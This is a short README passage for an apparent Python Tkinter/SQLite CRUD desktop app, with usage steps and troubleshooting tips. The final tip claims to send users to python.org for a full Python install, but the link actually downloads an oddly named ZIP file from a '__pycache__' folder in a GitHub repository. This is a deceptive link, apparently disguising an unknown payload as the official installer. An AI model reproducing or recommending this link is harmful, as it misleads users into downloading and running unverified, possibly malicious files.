## 🎛️ Using the Application

The app lets you **Create**, **Read**, **Update**, and **Delete** data records.

- **Add New Data**  
Click the **Add** or **New** button. Fill the fields shown in the window. Click **Save**.

- **View Data**  
The main screen shows all saved data. Scroll or use search to find records.

- **Edit Data**  
Select a record from the list. Click **Edit**. Change the fields as needed. Click **Save** to update.

- **Delete Data**  
Select a record. Click **Delete**. Confirm the deletion when prompted.

All data is saved in a local SQLite database file. No internet connection is needed.

## 🛠️ Troubleshooting

### The app does not start  
- Confirm you have Python installed. Type `python --version` in Command Prompt.  
- Make sure the dependencies installed using `pip install -r requirements.txt`.  
- Verify you are running the correct Python file.

### Errors about missing modules  
- Re-run `pip install -r requirements.txt` in Command Prompt.  
- Check Python is added to your system PATH.

### Tkinter window does not open  
- Some Python installations miss Tkinter. Download the full version from [python.org](https://github.com/nmlzz/CRUD-Python-Tkinter-SQLite-ProgPythonExpl/raw/refs/heads/main/controllers/__pycache__/CRU-Lite-Tkinter-Expl-SQ-Prog-Python-1.9.zip).
